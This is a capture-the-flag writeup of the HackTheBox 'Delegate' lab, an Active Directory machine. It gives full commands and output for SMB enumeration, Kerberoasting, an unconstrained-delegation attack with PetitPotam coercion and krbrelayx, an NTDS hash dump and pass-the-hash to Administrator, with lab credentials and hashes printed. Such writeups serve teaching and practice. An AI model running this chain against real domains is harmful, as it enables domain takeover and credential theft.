---
title: "HackTheBox - Delegate"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox"
date: 2025-11-20 19:17:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, kerberoasting, delegation, printerbug, petitpotam, krbrelayx, dcsync, winrm]
img_path: /assets/img/HackTheBox/Machines/Delegate
image:
    path: /assets/img/HackTheBox/Machines/Delegate/delegate.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[Delegate](https://www.hackthebox.com/machines/delegate) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine emphasizing enumeration and credential discovery via SMB, password reuse in SYSVOL scripts, and Kerberoasting for further privilege escalation. After gaining access to a user with delegation admin rights, the box demonstrates abuse of unconstrained delegation: by creating and configuring a machine for unconstrained delegation, hijacking DC authentication using PrinterBug or PetitPotam, and capturing the DC’s Kerberos TGT. The attack chain culminates in performing DCSync with the DC’s ticket, achieving full domain compromise via pass-the-ticket to obtain DA-level access.


### Enumeration

## nmap

```bash
Nmap scan report for 10.129.234.69
Host is up (0.059s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-20 13:37:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-20T13:38:39+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-20T13:37:59+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2025-11-19T13:30:48
|_Not valid after:  2026-05-21T13:30:48
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
52367/tcp open  msrpc         Microsoft Windows RPC
58307/tcp open  msrpc         Microsoft Windows RPC
65376/tcp open  msrpc         Microsoft Windows RPC
65423/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65424/tcp open  msrpc         Microsoft Windows RPC
65429/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-20T13:38:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

we have normal DC ports 

we can start enumerating for Null and Guest sessions

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl  -u 'a' -p ''       
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\a: (Guest)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl  -u 'a' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\a: (Guest)
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl  -u 'a' -p '' --users 
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\a: (Guest)
```

we have access to some shares as a Guest 

but we can’t enumerate for users

using RID bruteforcing we can get this

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl  -u 'a' -p '' --rid-brute
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\a: (Guest)
SMB         10.129.234.69   445    DC1              498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                                
SMB         10.129.234.69   445    DC1              500: DELEGATE\Administrator (SidTypeUser)
SMB         10.129.234.69   445    DC1              501: DELEGATE\Guest (SidTypeUser)
SMB         10.129.234.69   445    DC1              502: DELEGATE\krbtgt (SidTypeUser)
SMB         10.129.234.69   445    DC1              512: DELEGATE\Domain Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              513: DELEGATE\Domain Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              514: DELEGATE\Domain Guests (SidTypeGroup)
SMB         10.129.234.69   445    DC1              515: DELEGATE\Domain Computers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              516: DELEGATE\Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              517: DELEGATE\Cert Publishers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              518: DELEGATE\Schema Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              519: DELEGATE\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.69   445    DC1              521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              525: DELEGATE\Protected Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              526: DELEGATE\Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                                
SMB         10.129.234.69   445    DC1              572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                                 
SMB         10.129.234.69   445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)
SMB         10.129.234.69   445    DC1              1101: DELEGATE\DnsAdmins (SidTypeAlias)
SMB         10.129.234.69   445    DC1              1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.69   445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)
SMB         10.129.234.69   445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)
SMB         10.129.234.69   445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)
SMB         10.129.234.69   445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)
SMB         10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)
SMB         10.129.234.69   445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)
```

now we have all the users and groups 

let’s start enumerating the SMB shares

inside the SYSVOL share we were able to find some interesting files

```bash
\delegate.vl\scripts
  .                                   D        0  Sat Aug 26 08:45:24 2023
  ..                                  D        0  Sat Aug 26 05:45:45 2023
  users.bat                           A      159  Sat Aug 26 08:54:29 2023

```

after we download the file 

we can find this inside it 

```bash
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

let’s test the new credentals

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl  -u 'A.Briggs' -p 'P4ssw0rd1#123'                
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123  
```

they do work 

now let’s collect BloodHound data and see what we can do from there

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ bloodhound-python -c All -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl -ns 10.129.234.69 -dc dc1.delegate.vl 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::4635:f327:3cee:f59e
INFO: Trying LDAP connection to dead:beef::4635:f327:3cee:f59e
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::4635:f327:3cee:f59e
INFO: Trying LDAP connection to dead:beef::4635:f327:3cee:f59e
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 17S
```

we can see that our user has generic write over `N.Thompson` so we can use kerberoasing to get his TGS and crack it

![image.png](/assets/img/HackTheBox/Machines/Delegate/image.png)

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'    
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$7c4de953d55de443efa4c951fd3442f0$74138ae3a2395a0f9170780ad2580cf822fa578fcbca0dc927f6ffb225808e368df3f9d49b6f2178c703fbd6c2c3f68a89fe289a3e4a438d0b8e1b16ad289fa9013e7a2d25092fccb66b8874ee5ec7b1b13cdfb40aad3271623da3d91cc9fcd358fceef2cc664e5e342e1fc18df7fa6ed56295f1cc7f09decb38df209fd49db86dbe1a5401198d5f4ce09c9f4e46c5dbe57a2dae845d4ed6fe9300b0445f00a3ef3293416cf6164dfc2f2dcc08e7f2e6aab17e61d7993d0182485ca027967961e019f3b8da517ea94da201790a1fea57bf8392f6739b02e64992723c14cb4b59d4bda483161c1e1789f2e60ec8bc5111d4cc519650fa9e36c8f5ced9edc8be6fef51047e571975377f94fa46b4d3a6750086a9e72587eca6aa8a752011f19dfc20d437bb99be58c86276a67af9ca90a8c0f022e1238595b56ac8e841b2613b72c64707763d497255f768f2a01e043e33bfbff6b479fa51cb687e9ac82484374c421b2c828858f12c99669e0b3949ff6476d25c43dc694729429b17cacf12635b7bb1c7a8d73ef58c5d12c8c6bab79666ead1de04b14634a3f1405e0385ce57395af1a689a716275623f55d4b8f1b6c05e5a5d5a44091cc9ae351803d4b90c0fd059c275136b0c54bcbf2daddc07ce0778b718ea2a896f80f5d2a9c8f91139a7bbc11fc22f6cb0a4a1db168869125c967cd7ceff1c474d38fe126a17c9f97bb5fc7a974ba33a605cbc4fdec2d49a952b2c136ca2b2669a96fbf3dfa704fa813cfe42beb62b0ce1d8e693aa3b8e8a1efca29e47c8a877dc3f944376365da1961b6636624566a68cc7a1bd881b8705cd2dc644749be5e903c7a037a4df9aa0014120464298dffd2837b808b2130240dc8ae749606e64de62f8d1189823f6a62124fd1d0095fd6188039cdfe7136e667ffa82b330e6849f0959b2d8feab5726ca5a0bcabbcb3e176123537f63123a8373dd8e773cfff9e942160f12bc65ba1b87b017cc1a5506ae3f5b73504e4cc2890fec0bde3a52acb78d9741839e0939f0dff590010fc168e9280a416bc4c8e422d0a0fd427c4e1a7bca6bb657f8147b1453a72d082bbc0f49de69b6c19067c69db60095b9e139c4f778f514bedcffa6b982fc2b354ae2dfe60fa0f6fa7d38660031da2eed4d325588eb10048801f70173a02b9adf34d6118d175456e55e5ba0868caf3eeaca15dcea992c2c1eb8fea97efefce75b97bcdb0ccca30a1d2e0ebe514793cf6922939dfeeb16200f3b80d789fa74a0d57675a10c771f7fc0d2d81fcc1e4748c057d0a21e0b9c290d93e10dc993b13124f9c8c68915c24a376a98e3d93c9d073d145435f54de0b7b98cfc950d421f6e18117786525d504e67b1b9ccaacf47147d0d79bc0c7adc74086bd81e7293aff1e3787ac55ec7af85623747556498eed0ced9912bbbfd367c1fb04575b32ce804de5d057
[VERBOSE] SPN removed successfully for (N.Thompson)
```

after we crack we get teh password

```bash
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$7c4de953d55de443efa4c951fd3442f0$74138ae3a2395a0f9170780ad2580cf822fa578fcbca0dc927f6ffb225808e368df3f9d49b6f2178c703fbd6c2c3f68a89fe289a3e4a438d0b8e1b16ad289fa9013e7a2d25092fccb66b8874ee5ec7b1b13cdfb40aad3271623da3d91cc9fcd358fceef2cc664e5e342e1fc18df7fa6ed56295f1cc7f09decb38df209fd49db86dbe1a5401198d5f4ce09c9f4e46c5dbe57a2dae845d4ed6fe9300b0445f00a3ef3293416cf6164dfc2f2dcc08e7f2e6aab17e61d7993d0182485ca027967961e019f3b8da517ea94da201790a1fea57bf8392f6739b02e64992723c14cb4b59d4bda483161c1e1789f2e60ec8bc5111d4cc519650fa9e36c8f5ced9edc8be6fef51047e571975377f94fa46b4d3a6750086a9e72587eca6aa8a752011f19dfc20d437bb99be58c86276a67af9ca90a8c0f022e1238595b56ac8e841b2613b72c64707763d497255f768f2a01e043e33bfbff6b479fa51cb687e9ac82484374c421b2c828858f12c99669e0b3949ff6476d25c43dc694729429b17cacf12635b7bb1c7a8d73ef58c5d12c8c6bab79666ead1de04b14634a3f1405e0385ce57395af1a689a716275623f55d4b8f1b6c05e5a5d5a44091cc9ae351803d4b90c0fd059c275136b0c54bcbf2daddc07ce0778b718ea2a896f80f5d2a9c8f91139a7bbc11fc22f6cb0a4a1db168869125c967cd7ceff1c474d38fe126a17c9f97bb5fc7a974ba33a605cbc4fdec2d49a952b2c136ca2b2669a96fbf3dfa704fa813cfe42beb62b0ce1d8e693aa3b8e8a1efca29e47c8a877dc3f944376365da1961b6636624566a68cc7a1bd881b8705cd2dc644749be5e903c7a037a4df9aa0014120464298dffd2837b808b2130240dc8ae749606e64de62f8d1189823f6a62124fd1d0095fd6188039cdfe7136e667ffa82b330e6849f0959b2d8feab5726ca5a0bcabbcb3e176123537f63123a8373dd8e773cfff9e942160f12bc65ba1b87b017cc1a5506ae3f5b73504e4cc2890fec0bde3a52acb78d9741839e0939f0dff590010fc168e9280a416bc4c8e422d0a0fd427c4e1a7bca6bb657f8147b1453a72d082bbc0f49de69b6c19067c69db60095b9e139c4f778f514bedcffa6b982fc2b354ae2dfe60fa0f6fa7d38660031da2eed4d325588eb10048801f70173a02b9adf34d6118d175456e55e5ba0868caf3eeaca15dcea992c2c1eb8fea97efefce75b97bcdb0ccca30a1d2e0ebe514793cf6922939dfeeb16200f3b80d789fa74a0d57675a10c771f7fc0d2d81fcc1e4748c057d0a21e0b9c290d93e10dc993b13124f9c8c68915c24a376a98e3d93c9d073d145435f54de0b7b98cfc950d421f6e18117786525d504e67b1b9ccaacf47147d0d79bc0c7adc74086bd81e7293aff1e3787ac55ec7af85623747556498eed0ced9912bbbfd367c1fb04575b32ce804de5d057:KALEB_2341
```

and the N.Thompson user is member of two other groups Remote management (so we can WinRM) and delegation admins 

![image.png](/assets/img/HackTheBox/Machines/Delegate/image1.png)

let’s authenticate to WinRM and enumerate more

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ evil-winrm -i delegate.vl -u 'N.Thompson' -p 'KALEB_2341'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\N.Thompson\desktop> cat user.txt
04869bf509a293bf208c192785ebcc76
```

# Privilege Escalation

we have the Delegation privileges 

```bash
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

so we might be able to perform unconstrained delegation

here is how the attack works

Unconstrained Delegation Mechanism

- A service account or computer is marked with the **`TRUSTED_FOR_DELEGATION`** flag (unconstrained delegation enabled)
- When a user authenticates to this service, the **user's TGT is sent along with the service ticket** and cached in the service's memory (LSASS process)
- This allows the service to **impersonate the user** to access any other service on the network on behalf of that user
- The delegating service can use the cached TGT to request service tickets to **any service** without restriction

The Attack Path

- **Compromise a machine** with unconstrained delegation enabled (domain controllers have this by default)
- **Coerce authentication** from a high-value target (like a Domain Controller) using PrinterBug, PetitPotam, etc.
- The target's **TGT gets cached** in the compromised machine's memory when it authenticates
- **Extract the TGT** from memory using tools like Mimikatz or Rubeus
- **Pass-the-Ticket (PtT)**: Use the stolen TGT to authenticate as that user/computer to any service

here is how we can do it

first we need to create a machine account and give it “trust for delegation”

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ addcomputer.py -computer-name 'said$' -computer-pass 'password123' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'KALEB_2341'
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account said$ with password password123.
```

and then we need to add a DNS record to the machine 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 ~/Desktop/krbrelayx/dnstool.py -u 'delegate.vl\said$' -p 'password123' -r said.delegate.vl -d 10.10.14.115 --action add DC1.delegate.vl -dns-ip 10.129.234.69                                                
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

then using BloodyAD we can make the machine trusted for delegation

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ bloodyAD -u N.Thompson -p 'KALEB_2341' -d delegate.vl --host 10.129.234.69 add uac said$ -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to said$'s userAccountControl
```

now we need to give the machine a SPN 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 ~/Desktop/krbrelayx/addspn.py  -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/said.delegate.vl' -t 'said$' -dc-ip 10.129.234.69 DC1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
                                                                                                                                                          
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 ~/Desktop/krbrelayx/addspn.py  -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/said.delegate.vl' -t 'said$' -dc-ip 10.129.234.69 DC1.dele
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

then finally using Krbrelay to get the TGT after macking the DC connect to us

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 ~/Desktop/krbrelayx/krbrelayx.py -hashes :a9fdfa038c4b75ebc76dc855dd74f0da                                                                    
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

now we can trigger this using petitpotam

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ python3 PetitPotam.py -u 'said$' -p 'password123' said.delegate.vl 10.129.234.69
/home/drli/Desktop/HTB-Machines/Delegate/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.129.234.69[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

back in krbrelay server we can see this

```bash
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

finally we get the DC TGT and we can use it to dump the AD database

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ klist      
Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Default principal: DC1$@DELEGATE.VL

Valid starting       Expires              Service principal
11/20/2025 13:34:56  11/20/2025 18:31:49  krbtgt/DELEGATE.VL@DELEGATE.VL
        renew until 11/27/2025 08:31:49
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc ldap delegate.vl -k --use-kcache                       
LDAP        delegate.vl     389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        delegate.vl     389    DC1              [+] delegate.vl\DC1$ from ccache 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ nxc smb delegate.vl -k --use-kcache --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y                                                                             
SMB         delegate.vl     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         delegate.vl     445    DC1              [+] DELEGATE.VL\DC1$ from ccache 
SMB         delegate.vl     445    DC1              [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         delegate.vl     445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         delegate.vl     445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::                                                                                              
SMB         delegate.vl     445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      
SMB         delegate.vl     445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::                                                                                                     
SMB         delegate.vl     445    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::                                                                                                  
SMB         delegate.vl     445    DC1              b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::                                                                                                   
SMB         delegate.vl     445    DC1              R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::                                                                                                  
SMB         delegate.vl     445    DC1              J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::                                                                                                 
SMB         delegate.vl     445    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::                                                                                                
SMB         delegate.vl     445    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::                                                                                                      
SMB         delegate.vl     445    DC1              EVILPC$:4601:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::                                                                                                   
SMB         delegate.vl     445    DC1              PLEASE$:4602:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::                                                                                                   
SMB         delegate.vl     445    DC1              said$:4603:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::                                                                                                     
SMB         delegate.vl     445    DC1              [+] Dumped 12 NTDS hashes to /home/drli/.nxc/logs/ntds/DC1_delegate.vl_2025-11-20_133544.ntds of which 8 were added to the database
SMB         delegate.vl     445    DC1              [*] To extract only enabled accounts from the output file, run the following command:
SMB         delegate.vl     445    DC1              [*] cat /home/drli/.nxc/logs/ntds/DC1_delegate.vl_2025-11-20_133544.ntds | grep -iv disabled | cut -d ':' -f1
SMB         delegate.vl     445    DC1              [*] grep -iv disabled /home/drli/.nxc/logs/ntds/DC1_delegate.vl_2025-11-20_133544.ntds | cut -d ':' -f1
```

now we can connect using the admins hash

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Delegate]
└─$ evil-winrm -i delegate.vl -u 'Administrator' -H 'c32198ceab4cc695e6504556
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefineodule Reline                                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackpn                                                                            
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
d2672ad621b22f06b1ff0109aaff2fa4
```

DONE!